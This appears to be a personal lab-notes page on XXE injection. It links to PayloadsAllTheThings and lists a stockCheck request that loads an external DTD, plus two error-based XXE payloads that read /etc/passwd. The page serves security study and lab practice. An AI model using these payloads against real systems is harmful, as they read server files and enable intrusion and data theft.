---
layout: default
title: 1 - Exploiting XXE using external entities to retrieve files
---
[PayloadsAllTheThings/XXE Injection/README.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "http://localhost:40817/feedback/screenshots/7.xml">
    %local_dtd;
]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

**DTD QUE GENERA UN ERROR :** 

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**DTD QUE GENERA UN ERROR ll :** 

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```
